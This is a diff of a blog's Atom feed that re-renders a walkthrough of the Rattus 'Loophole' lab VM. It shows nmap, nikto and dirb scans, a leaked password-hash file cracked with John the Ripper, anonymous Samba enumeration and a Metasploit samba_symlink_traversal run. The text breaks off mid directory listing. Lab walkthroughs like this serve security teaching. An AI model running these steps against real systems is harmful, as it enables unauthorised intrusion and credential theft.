@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Rattus | 0x73696e65]]></title>
   <link href="http://73696e65.github.io/blog/categories/rattus/atom.xml" rel="self"/>
   <link href="http://73696e65.github.io/"/>
-  <updated>2015-07-04T15:46:55+02:00</updated>
+  <updated>2015-07-04T15:53:36+02:00</updated>
   <id>http://73696e65.github.io/</id>
   <author>
     <name><![CDATA[Norbert Szetei]]></name>
@@ -23,353 +23,610 @@
 <p>Our objective was to find and decrypt the &lsquo;Private.doc.enc&rsquo; file.  When we
 boot the image, we can see the network information. With ipcalc we display the
 possible hosts:
-{% codeblock %}
-root@kali32:~# ipcalc 10.8.7.0/255.255.255.248
-Address:   10.8.7.0             00001010.00001000.00000111.00000 000
-Netmask:   255.255.255.248 = 29 11111111.11111111.11111111.11111 000
-Wildcard:  0.0.0.7              00000000.00000000.00000000.00000 111
-=>
-Network:   10.8.7.0/29          00001010.00001000.00000111.00000 000
-HostMin:   10.8.7.1             00001010.00001000.00000111.00000 001
-HostMax:   10.8.7.6             00001010.00001000.00000111.00000 110
-Broadcast: 10.8.7.7             00001010.00001000.00000111.00000 111
-Hosts/Net: 6                     Class A, Private Internet
-{% endcodeblock %}</p>
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# ipcalc 10.8.7.0/255.255.255.248
+</span><span class='line'>Address:   10.8.7.0             00001010.00001000.00000111.00000 000
+</span><span class='line'>Netmask:   255.255.255.248 = 29 11111111.11111111.11111111.11111 000
+</span><span class='line'>Wildcard:  0.0.0.7              00000000.00000000.00000000.00000 111
+</span><span class='line'>=>
+</span><span class='line'>Network:   10.8.7.0/29          00001010.00001000.00000111.00000 000
+</span><span class='line'>HostMin:   10.8.7.1             00001010.00001000.00000111.00000 001
+</span><span class='line'>HostMax:   10.8.7.6             00001010.00001000.00000111.00000 110
+</span><span class='line'>Broadcast: 10.8.7.7             00001010.00001000.00000111.00000 111
+</span><span class='line'>Hosts/Net: 6                     Class A, Private Internet</span></code></pre></td></tr></table></div></figure></p>
 
 <p>We assign the last IP address from network 10.8.7.0/29:
-{% codeblock %}
-root@kali32:~# ifconfig eth0:1 10.8.7.6
-{% endcodeblock %}</p>
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# ifconfig eth0:1 10.8.7.6</span></code></pre></td></tr></table></div></figure></p>
 
 <p>Nmap output:
-{% codeblock %}
-root@kali32:~# nmap -sV 10.8.7.2 -p-</p>
-
-<p>Starting Nmap 6.47 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2015-04-25 12:25 CEST
-Nmap scan report for 10.8.7.2
-Host is up (0.0017s latency).
-Not shown: 65530 closed ports
-PORT    STATE SERVICE     VERSION
-22/tcp  open  ssh         OpenSSH 4.4 (protocol 1.99)
-80/tcp  open  http        Apache httpd 1.3.31 ((Unix) PHP/4.4.4)
-113/tcp open  ident?
-139/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
-445/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
-MAC Address: 00:0C:29:53:2F:A3 (VMware)
-{% endcodeblock %}</p>
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# nmap -sV 10.8.7.2 -p-&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>Starting Nmap 6.47 ( &lt;a href="http://nmap.org">http://nmap.org&lt;/a> ) at 2015-04-25 12:25 CEST
+</span><span class='line'>Nmap scan report for 10.8.7.2
+</span><span class='line'>Host is up (0.0017s latency).
+</span><span class='line'>Not shown: 65530 closed ports
+</span><span class='line'>PORT    STATE SERVICE     VERSION
+</span><span class='line'>22/tcp  open  ssh         OpenSSH 4.4 (protocol 1.99)
+</span><span class='line'>80/tcp  open  http        Apache httpd 1.3.31 ((Unix) PHP/4.4.4)
+</span><span class='line'>113/tcp open  ident?
+</span><span class='line'>139/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
+</span><span class='line'>445/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
+</span><span class='line'>MAC Address: 00:0C:29:53:2F:A3 (VMware)</span></code></pre></td></tr></table></div></figure></p>
 
 <p>Nikto output:
-{% codeblock %}
-root@kali32:~# nikto -h 10.8.7.2</p>
-
-<h2>- Nikto v2.1.6</h2>
-
-<ul>
-<li>Target IP:          10.8.7.2</li>
-<li>Target Hostname:    10.8.7.2</li>
-<li>Target Port:        80
-
-<ul>
-<li>Start Time:         2015-05-08 18:41:31 (GMT2)</li>
-</ul>
-</li>
-</ul>
-
-
-<hr />
-
-<ul>
-<li>Server: Apache/1.3.31 (Unix) PHP/4.4.4</li>
-<li>Server leaks inodes via ETags, header found with file /, inode: 20924, size: 3001, mtime: Fri Feb 18 12:33:59 2011</li>
-<li>The anti-clickjacking X-Frame-Options header is not present.</li>
-<li>OSVDB-637: Enumeration of users is possible by requesting ~username (responds with &lsquo;Forbidden&rsquo; for users, &lsquo;not found&rsquo; for non-existent users).</li>
-<li>Uncommon header &lsquo;tcn&rsquo; found, with contents: list</li>
-<li>Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See <a href="http://www.wisec.it/sectou.php?id=4698ebdc59d15.">http://www.wisec.it/sectou.php?id=4698ebdc59d15.</a> The following alternatives for &lsquo;index&rsquo; were found: index.html</li>
-<li>OSVDB-27487: Apache is vulnerable to XSS via the Expect header</li>
-<li>PHP/4.4.4 appears to be outdated (current is at least 5.4.26)</li>
-<li>Apache/1.3.31 appears to be outdated (current is at least Apache/2.4.7). Apache 2.0.65 (final release) and 2.2.26 are also current.</li>
-<li>Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE, POST, PUT, DELETE, CONNECT, PATCH, PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, UNLOCK</li>
-<li>OSVDB-397: HTTP method (&lsquo;Allow&rsquo; Header): &lsquo;PUT&rsquo; method could allow clients to save files on the web server.</li>
-<li>OSVDB-5646: HTTP method (&lsquo;Allow&rsquo; Header): &lsquo;DELETE&rsquo; may allow clients to remove files on the web server.</li>
-<li>HTTP method (&lsquo;Allow&rsquo; Header): &lsquo;CONNECT&rsquo; may allow server to proxy client requests.</li>
-<li>HTTP method: &lsquo;PATCH&rsquo; may allow client to issue patch commands to server. See RFC-5789.</li>
-<li>OSVDB-5647: HTTP method (&lsquo;Allow&rsquo; Header): &lsquo;MOVE&rsquo; may allow clients to change file locations on the web server.</li>
-<li>WebDAV enabled (UNLOCK LOCK MKCOL COPY PROPPATCH PROPFIND listed as allowed)</li>
-<li>OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST</li>
-<li>Retrieved x-powered-by header: PHP/4.4.4</li>
-<li>OSVDB-3092: /info/: This might be interesting&hellip;</li>
-<li>OSVDB-3233: /info.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.</li>
-<li>OSVDB-3268: /icons/: Directory indexing found.</li>
-<li>OSVDB-3233: /icons/README: Apache default file found.</li>
-<li>OSVDB-5292: /info.php?file=<a href="http://cirt.net/rfiinc.txt?:">http://cirt.net/rfiinc.txt?:</a> RFI from RSnake&rsquo;s list (<a href="http://ha.ckers.org/weird/rfi-locations.dat">http://ha.ckers.org/weird/rfi-locations.dat</a>) or from <a href="http://osvdb.org/">http://osvdb.org/</a></li>
-<li>7355 requests: 0 error(s) and 22 item(s) reported on remote host
-
-<ul>
-<li>End Time:           2015-05-08 18:41:43 (GMT2) (12 seconds)</li>
-</ul>
-</li>
-</ul>
-
-
-<hr />
-
-<ul>
-<li>1 host(s) tested
-{% endcodeblock %}</li>
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# nikto -h 10.8.7.2&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;h2>- Nikto v2.1.6&lt;/h2>
+</span><span class='line'>
+</span><span class='line'>&lt;ul>
+</span><span class='line'>&lt;li>Target IP:          10.8.7.2&lt;/li>
+</span><span class='line'>&lt;li>Target Hostname:    10.8.7.2&lt;/li>
+</span><span class='line'>&lt;li>Target Port:        80
+</span><span class='line'>
+</span><span class='line'>&lt;ul>
+</span><span class='line'>&lt;li>Start Time:         2015-05-08 18:41:31 (GMT2)&lt;/li>
+</span><span class='line'>&lt;/ul>
+</span><span class='line'>&lt;/li>
+</span><span class='line'>&lt;/ul>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>&lt;hr />
+</span><span class='line'>
+</span><span class='line'>&lt;ul>
+</span><span class='line'>&lt;li>Server: Apache/1.3.31 (Unix) PHP/4.4.4&lt;/li>
+</span><span class='line'>&lt;li>Server leaks inodes via ETags, header found with file /, inode: 20924, size: 3001, mtime: Fri Feb 18 12:33:59 2011&lt;/li>
+</span><span class='line'>&lt;li>The anti-clickjacking X-Frame-Options header is not present.&lt;/li>
+</span><span class='line'>&lt;li>OSVDB-637: Enumeration of users is possible by requesting ~username (responds with &lsquo;Forbidden&rsquo; for users, &lsquo;not found&rsquo; for non-existent users).&lt;/li>
+</span><span class='line'>&lt;li>Uncommon header &lsquo;tcn&rsquo; found, with contents: list&lt;/li>
+</span><span class='line'>&lt;li>Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See &lt;a href="http://www.wisec.it/sectou.php?id=4698ebdc59d15.">http://www.wisec.it/sectou.php?id=4698ebdc59d15.&lt;/a> The following alternatives for &lsquo;index&rsquo; were found: index.html&lt;/li>
+</span><span class='line'>&lt;li>OSVDB-27487: Apache is vulnerable to XSS via the Expect header&lt;/li>
+</span><span class='line'>&lt;li>PHP/4.4.4 appears to be outdated (current is at least 5.4.26)&lt;/li>
+</span><span class='line'>&lt;li>Apache/1.3.31 appears to be outdated (current is at least Apache/2.4.7). Apache 2.0.65 (final release) and 2.2.26 are also current.&lt;/li>
+</span><span class='line'>&lt;li>Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE, POST, PUT, DELETE, CONNECT, PATCH, PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, UNLOCK&lt;/li>
+</span><span class='line'>&lt;li>OSVDB-397: HTTP method (&lsquo;Allow&rsquo; Header): &lsquo;PUT&rsquo; method could allow clients to save files on the web server.&lt;/li>
+</span><span class='line'>&lt;li>OSVDB-5646: HTTP method (&lsquo;Allow&rsquo; Header): &lsquo;DELETE&rsquo; may allow clients to remove files on the web server.&lt;/li>
+</span><span class='line'>&lt;li>HTTP method (&lsquo;Allow&rsquo; Header): &lsquo;CONNECT&rsquo; may allow server to proxy client requests.&lt;/li>
+</span><span class='line'>&lt;li>HTTP method: &lsquo;PATCH&rsquo; may allow client to issue patch commands to server. See RFC-5789.&lt;/li>
+</span><span class='line'>&lt;li>OSVDB-5647: HTTP method (&lsquo;Allow&rsquo; Header): &lsquo;MOVE&rsquo; may allow clients to change file locations on the web server.&lt;/li>
+</span><span class='line'>&lt;li>WebDAV enabled (UNLOCK LOCK MKCOL COPY PROPPATCH PROPFIND listed as allowed)&lt;/li>
+</span><span class='line'>&lt;li>OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST&lt;/li>
+</span><span class='line'>&lt;li>Retrieved x-powered-by header: PHP/4.4.4&lt;/li>
+</span><span class='line'>&lt;li>OSVDB-3092: /info/: This might be interesting&hellip;&lt;/li>
+</span><span class='line'>&lt;li>OSVDB-3233: /info.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.&lt;/li>
+</span><span class='line'>&lt;li>OSVDB-3268: /icons/: Directory indexing found.&lt;/li>
+</span><span class='line'>&lt;li>OSVDB-3233: /icons/README: Apache default file found.&lt;/li>
+</span><span class='line'>&lt;li>OSVDB-5292: /info.php?file=&lt;a href="http://cirt.net/rfiinc.txt?:">http://cirt.net/rfiinc.txt?:&lt;/a> RFI from RSnake&rsquo;s list (&lt;a href="http://ha.ckers.org/weird/rfi-locations.dat">http://ha.ckers.org/weird/rfi-locations.dat&lt;/a>) or from &lt;a href="http://osvdb.org/">http://osvdb.org/&lt;/a>&lt;/li>
+</span><span class='line'>&lt;li>7355 requests: 0 error(s) and 22 item(s) reported on remote host
+</span><span class='line'>
+</span><span class='line'>&lt;ul>
+</span><span class='line'>&lt;li>End Time:           2015-05-08 18:41:43 (GMT2) (12 seconds)&lt;/li>
+</span><span class='line'>&lt;/ul>
+</span><span class='line'>&lt;/li>
+</span><span class='line'>&lt;/ul>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>&lt;hr />
+</span><span class='line'>
+</span><span class='line'>&lt;ul>
+</span><span class='line'>&lt;li>1 host(s) tested</span></code></pre></td></tr></table></div></figure></li>
 </ul>
 
 
 <p>Dirb output:
-{% codeblock %}
-==> DIRECTORY: <a href="http://10.8.7.2/Images/">http://10.8.7.2/Images/</a>
-+ <a href="http://10.8.7.2/cgi-bin/">http://10.8.7.2/cgi-bin/</a> (CODE:403|SIZE:274)
-+ <a href="http://10.8.7.2/garbage">http://10.8.7.2/garbage</a> (CODE:200|SIZE:288)
-+ <a href="http://10.8.7.2/index">http://10.8.7.2/index</a> (CODE:200|SIZE:3001)
-+ <a href="http://10.8.7.2/index.html">http://10.8.7.2/index.html</a> (CODE:200|SIZE:3001)
-+ <a href="http://10.8.7.2/info">http://10.8.7.2/info</a> (CODE:200|SIZE:37715)
-+ <a href="http://10.8.7.2/info.php">http://10.8.7.2/info.php</a> (CODE:200|SIZE:37485)
-+ <a href="http://10.8.7.2/status">http://10.8.7.2/status</a> (CODE:200|SIZE:2456)
-+ <a href="http://10.8.7.2/~operator">http://10.8.7.2/~operator</a> (CODE:403|SIZE:275)
-+ <a href="http://10.8.7.2/~root">http://10.8.7.2/~root</a> (CODE:403|SIZE:271)
-{% endcodeblock %}</p>
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>==> DIRECTORY: &lt;a href="http://10.8.7.2/Images/">http://10.8.7.2/Images/&lt;/a>
+</span><span class='line'>+ &lt;a href="http://10.8.7.2/cgi-bin/">http://10.8.7.2/cgi-bin/&lt;/a> (CODE:403|SIZE:274)
+</span><span class='line'>+ &lt;a href="http://10.8.7.2/garbage">http://10.8.7.2/garbage&lt;/a> (CODE:200|SIZE:288)
+</span><span class='line'>+ &lt;a href="http://10.8.7.2/index">http://10.8.7.2/index&lt;/a> (CODE:200|SIZE:3001)
+</span><span class='line'>+ &lt;a href="http://10.8.7.2/index.html">http://10.8.7.2/index.html&lt;/a> (CODE:200|SIZE:3001)
+</span><span class='line'>+ &lt;a href="http://10.8.7.2/info">http://10.8.7.2/info&lt;/a> (CODE:200|SIZE:37715)
+</span><span class='line'>+ &lt;a href="http://10.8.7.2/info.php">http://10.8.7.2/info.php&lt;/a> (CODE:200|SIZE:37485)
+</span><span class='line'>+ &lt;a href="http://10.8.7.2/status">http://10.8.7.2/status&lt;/a> (CODE:200|SIZE:2456)
+</span><span class='line'>+ &lt;a href="http://10.8.7.2/~operator">http://10.8.7.2/~operator&lt;/a> (CODE:403|SIZE:275)
+</span><span class='line'>+ &lt;a href="http://10.8.7.2/~root">http://10.8.7.2/~root&lt;/a> (CODE:403|SIZE:271)</span></code></pre></td></tr></table></div></figure></p>
 
 <p>The most interesting file was <a href="http://10.8.7.2/garbage">http://10.8.7.2/garbage</a> with these hashes:
-{% codeblock %}
-root:$1$x2YBL0KB$E7QI7AF9ZeiqcfMRQ4KZ11:15018:0:::::
-smmsp:!!:9797:0:::::
-mysql:!!:9797:0:::::
-rpc:!!:9797:0:::::
-sshd:!!:9797:0:::::
-apache:!!:9797:0:::::
-nobody:!!:9797:0:::::
-mhog:$1$ZQAbXwf3$TgcNjljKW.2tlJw4OICDr1:15019:0:::::0
-tskies:$1$ZvNtdn0x$ck5hnAwXg.OLQPOtg28Hb.:15019:0:::::0
-{% endcodeblock %}</p>
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root:$1$x2YBL0KB$E7QI7AF9ZeiqcfMRQ4KZ11:15018:0:::::
+</span><span class='line'>smmsp:!!:9797:0:::::
+</span><span class='line'>mysql:!!:9797:0:::::
+</span><span class='line'>rpc:!!:9797:0:::::
+</span><span class='line'>sshd:!!:9797:0:::::
+</span><span class='line'>apache:!!:9797:0:::::
+</span><span class='line'>nobody:!!:9797:0:::::
+</span><span class='line'>mhog:$1$ZQAbXwf3$TgcNjljKW.2tlJw4OICDr1:15019:0:::::0
+</span><span class='line'>tskies:$1$ZvNtdn0x$ck5hnAwXg.OLQPOtg28Hb.:15019:0:::::0</span></code></pre></td></tr></table></div></figure></p>
 
 <p>We were able to crack each one:
-{% codeblock %}
-root@kali32:~# john garbage.hash &ndash;show
-root:albatros:15018:0:::::
-mhog:mhog:15019:0:::::0
-tskies:nostradamus:15019:0:::::0</p>
-
-<p>3 password hashes cracked, 0 left
-{% endcodeblock %}</p>
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# john garbage.hash &ndash;show
+</span><span class='line'>root:albatros:15018:0:::::
+</span><span class='line'>mhog:mhog:15019:0:::::0
+</span><span class='line'>tskies:nostradamus:15019:0:::::0&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>3 password hashes cracked, 0 left</span></code></pre></td></tr></table></div></figure></p>
 
 <p>Now we can log in as root via ssh, but because this was too easy, we decided to
 explore samba service too.
-{% codeblock %}
-root@kali32:~# smbclient -L\ -I 10.8.7.2
-Enter root&rsquo;s password:
-Anonymous login successful
-Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.23c]</p>
-
-<pre><code>    Sharename       Type      Comment
-    ---------       ----      -------
-    homes           Disk      Home directories
-    tmp             Disk      Temporary file space
-    IPC$            IPC       IPC Service (Samba server by Rattus labs)
-</code></pre>
-
-<p>Anonymous login successful
-Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.23c]</p>
-
-<pre><code>    Server               Comment
-    ---------            -------
-    LOOPHOLE             Samba server by Rattus labs
-
-    Workgroup            Master
-    ---------            -------
-    WORKGROUP            LOOPHOLE
-</code></pre>
-
-<p>root@kali32:~# smbclient //10.8.7.2/tmp
-Enter root&rsquo;s password:
-Anonymous login successful
-Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.23c]
-smb: > dir
-  .                                   D        0  Fri May 15 10:56:12 2015
-  ..                                  D        0  Fri May 15 12:55:54 2015
-  session_mm_apache0.sem              N        0  Fri May 15 10:56:12 2015
-  .X11-unix                          DH        0  Fri May 15 10:56:00 2015
-  .ICE-unix                          DH        0  Fri May 15 10:56:00 2015</p>
-
-<pre><code>            37571 blocks of size 4096. 0 blocks available
-</code></pre>
-
-<p>{% endcodeblock %}</p>
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# smbclient -L\ -I 10.8.7.2
+</span><span class='line'>Enter root&rsquo;s password:
+</span><span class='line'>Anonymous login successful
+</span><span class='line'>Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.23c]&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;pre>&lt;code>    Sharename       Type      Comment
+</span><span class='line'>    ---------       ----      -------
+</span><span class='line'>    homes           Disk      Home directories
+</span><span class='line'>    tmp             Disk      Temporary file space
+</span><span class='line'>    IPC$            IPC       IPC Service (Samba server by Rattus labs)
+</span><span class='line'>&lt;/code>&lt;/pre>
+</span><span class='line'>
+</span><span class='line'>&lt;p>Anonymous login successful
+</span><span class='line'>Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.23c]&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;pre>&lt;code>    Server               Comment
+</span><span class='line'>    ---------            -------
+</span><span class='line'>    LOOPHOLE             Samba server by Rattus labs
+</span><span class='line'>
+</span><span class='line'>    Workgroup            Master
+</span><span class='line'>    ---------            -------
+</span><span class='line'>    WORKGROUP            LOOPHOLE
+</span><span class='line'>&lt;/code>&lt;/pre>
+</span><span class='line'>
+</span><span class='line'>&lt;p>root@kali32:~# smbclient //10.8.7.2/tmp
+</span><span class='line'>Enter root&rsquo;s password:
+</span><span class='line'>Anonymous login successful
+</span><span class='line'>Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.23c]
+</span><span class='line'>smb: > dir
+</span><span class='line'>  .                                   D        0  Fri May 15 10:56:12 2015
+</span><span class='line'>  ..                                  D        0  Fri May 15 12:55:54 2015
+</span><span class='line'>  session_mm_apache0.sem              N        0  Fri May 15 10:56:12 2015
+</span><span class='line'>  .X11-unix                          DH        0  Fri May 15 10:56:00 2015
+</span><span class='line'>  .ICE-unix                          DH        0  Fri May 15 10:56:00 2015&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;pre>&lt;code>            37571 blocks of size 4096. 0 blocks available
+</span><span class='line'>&lt;/code>&lt;/pre>
+</span><span class='line'>
+</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></p>
 
 <p>The /tmp directory is writable. We can use samba_symlink_traversal exploit in
 Metasploit:</p>
 
-<p>{% codeblock %}
-msf auxiliary(samba_symlink_traversal) > show options</p>
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>msf auxiliary(samba_symlink_traversal) > show options&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>Module options (auxiliary/admin/smb/samba_symlink_traversal):&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>   Name       Current Setting  Required  Description&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;hr />
+</span><span class='line'>
+</span><span class='line'>&lt;p>   RHOST      10.8.7.2         yes       The target address
+</span><span class='line'>   RPORT      445              yes       Set the SMB service port
+</span><span class='line'>   SMBSHARE   tmp              yes       The name of a writeable share on the server
+</span><span class='line'>   SMBTARGET  rootfs           yes       The name of the directory that should point to the root filesystem&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>msf auxiliary(samba_symlink_traversal) > exploit&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>[&lt;em>] Connecting to the server&hellip;
+</span><span class='line'>[&lt;/em>] Trying to mount writeable share &lsquo;tmp&rsquo;&hellip;
+</span><span class='line'>[&lt;em>] Trying to link &lsquo;rootfs&rsquo; to the root filesystem&hellip;
+</span><span class='line'>[&lt;/em>] Now access the following share to browse the root filesystem:
+</span><span class='line'>[*]     \10.8.7.2\tmp\rootfs\&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>[*] Auxiliary module execution completed</span></code></pre></td></tr></table></div></figure></p>
 
-<p>Module options (auxiliary/admin/smb/samba_symlink_traversal):</p>
-
-<p>   Name       Current Setting  Required  Description</p>
-
-<hr />
-
-<p>   RHOST      10.8.7.2         yes       The target address
-   RPORT      445              yes       Set the SMB service port
-   SMBSHARE   tmp              yes       The name of a writeable share on the server
-   SMBTARGET  rootfs           yes       The name of the directory that should point to the root filesystem</p>
-
-<p>msf auxiliary(samba_symlink_traversal) > exploit</p>
-
-<p>[<em>] Connecting to the server&hellip;
-[</em>] Trying to mount writeable share &lsquo;tmp&rsquo;&hellip;
-[<em>] Trying to link &lsquo;rootfs&rsquo; to the root filesystem&hellip;
-[</em>] Now access the following share to browse the root filesystem:
-[*]     \10.8.7.2\tmp\rootfs\</p>
-
-<p>[*] Auxiliary module execution completed
-{% endcodeblock %}</p>
-
-<p>{% codeblock %}
-root@kali32:~# smbclient //10.8.7.2/tmp
-Enter root&rsquo;s password:
-Anonymous login successful
-Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.23c]
-smb: > dir
-  .                                   D        0  Fri May 15 12:23:06 2015
-  ..                                  D        0  Fri May 15 14:06:14 2015
-  rootfs                              D        0  Fri May 15 14:06:14 2015
-  session_mm_apache0.sem              N        0  Fri May 15 12:06:32 2015
-  .X11-unix                          DH        0  Fri May 15 12:06:20 2015
-  .ICE-unix                          DH        0  Fri May 15 12:06:20 2015</p>
-
-<pre><code>            37571 blocks of size 4096. 36565 blocks available
-</code></pre>
-
-<p>smb: > cd rootfs
-smb: \rootfs> dir
-  .                                   D        0  Fri May 15 14:06:14 2015
-  ..                                  D        0  Fri May 15 14:06:14 2015
-  root                                D        0  Fri May 15 12:06:42 2015
-  var                                 D        0  Thu Sep 28 23:17:18 2006
